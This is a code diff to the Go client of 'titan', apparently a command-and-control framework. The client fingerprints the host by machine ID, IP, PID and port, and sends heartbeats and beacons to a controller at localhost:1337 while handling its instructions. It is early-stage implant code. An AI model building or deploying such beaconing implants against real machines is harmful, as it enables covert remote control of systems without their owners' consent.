@@ -1,7 +1,6 @@
 package main
 
 import (
-	"crypto/sha256"
 	"fmt"
 	"log"
 	"net"
@@ -10,28 +9,34 @@ import (
 	"time"
 
 	"github.com/BradHacker/titan/models"
+	"github.com/denisbrodbeck/machineid"
 )
 
 func main() {
 	connection, err := CreateTCPConnection("localhost", "1337")
 	if err != nil {
-		log.Fatal(fmt.Errorf("Couldn't establish connection: %v", err))
+		log.Fatal(fmt.Errorf("couldn't establish connection: %v", err))
 	}
 
 	defer CloseConnection(connection)
 
-	instruction, err := WaitForInstruction(connection)
+	err = SendHeartbeat(GenerateHeartbeat(connection), connection)
 	if err != nil {
-		log.Fatal(fmt.Errorf("Error while waiting for instruction: %v", err))
+		log.Fatal(fmt.Errorf("error while generating heartbeat: %v", err))
 	}
 
-	testBeacon := generateTestBeacon(instruction, connection)
-	time.Sleep(1000)
+	// instruction, err := WaitForInstruction(connection)
+	// if err != nil {
+	// 	log.Fatal(fmt.Errorf("error while waiting for instruction: %v", err))
+	// }
 
-	err = SendBeacon(testBeacon, connection)
-	if err != nil {
-		log.Fatal(fmt.Errorf("Couldn't send beacon: %v", err))
-	}
+	// testBeacon := generateTestBeacon(instruction, connection)
+	// time.Sleep(1000)
+
+	// err = SendBeacon(testBeacon, connection)
+	// if err != nil {
+	// 	log.Fatal(fmt.Errorf("couldn't send beacon: %v", err))
+	// }
 }
 
 func generateTestBeacon(instruction models.Instruction, connection net.Conn) (beacon models.Beacon) {
@@ -46,21 +51,24 @@ func generateTestBeacon(instruction models.Instruction, connection net.Conn) (be
 	testAgent.IP = localAaddressParts[0]
 	testAgent.PID = GetProcessID()
 	testAgent.Port = localAaddressParts[1]
-	uuidHasher := sha256.New()
-	macs, err := GetMACAddrs()
+	// uuidHasher := sha256.New()
+	// macs, err := GetMACAddrs()
+	// if err != nil {
+	// 	macs = []string{"00:00:00:00:00:00"}
+	// }
+	// testAgent.UUID = uuidHasher.Sum(nil)
+	macId, err := machineid.ID();
 	if err != nil {
-		macs = []string{"00:00:00:00:00:00"}
+		fmt.Println(fmt.Errorf("error getting machine ID: %v", err))
+	} else {
+		testAgent.UUID = macId
 	}
-	uuidHasher.Write([]byte(hostname + strings.Join(macs, ":")))
-	testAgent.UUID = uuidHasher.Sum(nil)
 
-	instruction = HandleInstruction(instruction)
+	modifiedInstruction := HandleInstruction(instruction)
 
-	instruction.Agent = testAgent
+	modifiedInstruction.Agent = testAgent
 	
-	beacon.Action = instruction.Action
-	beacon.Agent = testAgent
-	beacon.Instruction = instruction
+	beacon.Instruction = modifiedInstruction
 	beacon.ReceivedAt = time.Now()
 	return
 }
